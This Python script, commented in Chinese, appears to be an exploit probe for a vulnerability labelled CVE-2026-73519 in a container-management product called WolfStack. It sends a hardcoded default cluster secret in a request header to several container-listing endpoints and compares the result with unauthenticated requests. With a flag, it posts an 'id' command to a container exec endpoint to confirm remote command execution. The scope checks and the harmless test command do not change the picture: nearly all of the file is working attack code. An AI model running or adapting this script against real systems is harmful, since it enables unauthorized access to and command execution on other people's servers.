#!/usr/bin/env python3
"""WolfStack CVE-2026-73519：默认集群密钥头探测（授权范围内）。

默认只验证 X-WolfStack-Secret 能否过鉴权并列出容器；--exec 才尝试无害 id。
必须与「无密钥请求」对照，避免把公开 200 误报成漏洞。
"""
from __future__ import annotations

import argparse
import json
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

# 源码常量 src/auth/mod.rs（≤25.9.1 默认）
DEFAULT_SECRET = "wsk_a7f3b9e2c1d4f6a8b0e3d5c7f9a1b3d5e7f9a1c3b5d7e9f0a2b4c6d8e0f1a3"
UA = "Mozilla/5.0 大爱仙尊-wolfstack"
LIST_PATHS = (
    "/api/containers",
    "/api/containers/docker",
    "/api/v1/containers",
    "/api/docker/containers",
)


def _get(sess: requests.Session, url: str, secret: str | None) -> requests.Response | None:
    headers = {"User-Agent": UA}
    if secret:
        headers["X-WolfStack-Secret"] = secret
    try:
        return sess.get(url, timeout=12, verify=False, headers=headers)
    except Exception:
        return None


def _parse_containers(body: str) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    try:
        data = json.loads(body)
    except Exception:
        return out
    arr: Any
    if isinstance(data, list):
        arr = data
    elif isinstance(data, dict):
        arr = data.get("containers") or data.get("data") or data.get("Items") or []
    else:
        return out
    if not isinstance(arr, list):
        return out
    for c in arr[:40]:
        if not isinstance(c, dict):
            continue
        cid = c.get("id") or c.get("Id") or c.get("ID") or ""
        name = c.get("name") or c.get("Name")
        names = c.get("Names")
        if isinstance(names, list) and names:
            name = names[0]
        out.append({"id": str(cid)[:64], "name": name})
    return out


def _looks_like_container_list(status: int, body: str) -> bool:
    if status != 200 or not body:
        return False
    low = body.lower()
    if body.strip().startswith("["):
        return True
    return any(k in low for k in ("container", '"id"', "image", "names"))


def run(base_url: str, case: str, out: Path | None, do_exec: bool) -> dict[str, Any]:
    host = host_of(base_url)
    if host and not in_scope(host):
        print(f"[!] 不在 scope：{host}", file=sys.stderr)
        sys.exit(2)
    base = base_url.rstrip("/")
    sess = requests.Session()

    report: dict[str, Any] = {
        "target": base_url,
        "ts": datetime.now(UTC).isoformat(),
        "secret_used": "built-in-default",
        "auth_ok": False,
        "baseline_open": False,
        "containers": [],
        "exec": None,
        "playbook": "传承/狼栈·死契.md",
        "skill": "杀招/常山阴·狼栈",
        "cve": "CVE-2026-73519",
    }

    for path in LIST_PATHS:
        url = base + path
        r0 = _get(sess, url, None)
        r1 = _get(sess, url, DEFAULT_SECRET)
        st0 = r0.status_code if r0 is not None else None
        st1 = r1.status_code if r1 is not None else None
        body0 = (r0.text or "") if r0 is not None else ""
        body1 = (r1.text or "") if r1 is not None else ""
        open0 = _looks_like_container_list(st0 or 0, body0)
        open1 = _looks_like_container_list(st1 or 0, body1)

        if open0 and open1:
            # 无密钥也能列 → 未鉴权面板，不一定是默认密钥洞
            report["baseline_open"] = True
            report["auth_ok"] = True
            report["list_path"] = path
            report["list_status"] = st1
            report["note"] = "无密钥也可列容器（裸奔），默认密钥非必要"
            report["containers"] = _parse_containers(body1) or _parse_containers(body0)
            print(f"  [+] {path} 裸奔可列（baseline=open） containers≈{len(report['containers'])}")
            break

        if open1 and not open0:
            report["auth_ok"] = True
            report["list_path"] = path
            report["list_status"] = st1
            report["list_snippet"] = body1[:400]
            report["containers"] = _parse_containers(body1)
            report["note"] = "默认密钥头放行，无密钥被拒 → CVE-2026-73519 高置信"
            print(f"  [+] 默认密钥生效 → {path} containers≈{len(report['containers'])}")
            break

        if st1 in (401, 403) and st0 in (401, 403, None):
            report["list_status"] = st1
            print(f"  [-] {path} → {st1}（可能已轮换自定义密钥）")

    if do_exec and report["auth_ok"] and report["containers"]:
        cid = report["containers"][0].get("id") or ""
        if cid:
            for runtime in ("docker", "lxc"):
                url = f"{base}/api/containers/{runtime}/{cid}/exec"
                try:
                    r = sess.post(
                        url,
                        json={"cmd": ["id"], "command": "id"},
                        timeout=15,
                        verify=False,
                        headers={"User-Agent": UA, "X-WolfStack-Secret": DEFAULT_SECRET},
                    )
                except Exception as e:
                    report["exec"] = {"error": str(e), "runtime": runtime}
                    continue
                report["exec"] = {
                    "runtime": runtime,
                    "status": r.status_code,
                    "snippet": (r.text or "")[:300],
                }
                if r.status_code < 400 and (
                    "uid=" in (r.text or "") or "root" in (r.text or "").lower()
                ):
                    print(f"  [+] exec ok runtime={runtime}")
                    break

    out_path = write_probe_json(
        report, case=case, out=out, case_subdir="wolfstack", filename="probe.json"
    )
    print(
        json.dumps(
            {
                "auth_ok": report["auth_ok"],
                "baseline_open": report["baseline_open"],
                "containers": len(report["containers"]),
                "out": str(out_path),
            },
            ensure_ascii=False,
        )
    )
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="WolfStack 默认集群密钥探针")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--exec", action="store_true", help="对首个容器试无害 id")
    args = ap.parse_args()
    run(args.url, args.case, args.out, args.exec)


if __name__ == "__main__":
    main()
